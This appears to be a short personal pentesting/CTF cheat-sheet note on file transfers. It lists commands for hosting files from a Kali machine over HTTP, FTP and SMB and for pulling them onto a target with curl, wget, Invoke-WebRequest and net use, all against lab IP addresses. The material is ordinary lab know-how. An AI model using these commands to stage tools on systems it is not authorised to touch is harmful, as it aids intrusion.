---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[File Transfers]]  
___

## Description:  

### http
host webpage on Kali
`python3 -m http.server 80`

Get the file with:
```
curl http://192.168.19.55/test.c --output test.c

wget 172.16.0.109/test

Invoke-WebRequest http://10.10.14.45:1234/required_tool -O tool


```

### FTP server
`sudo python3 -m pyftpdlib -p21 -w`

### SMB server
```
On kali:

sudo smbserver.py share `pwd`

On Windows:

net use z: \\10.10.14.10\share

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (01:18 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
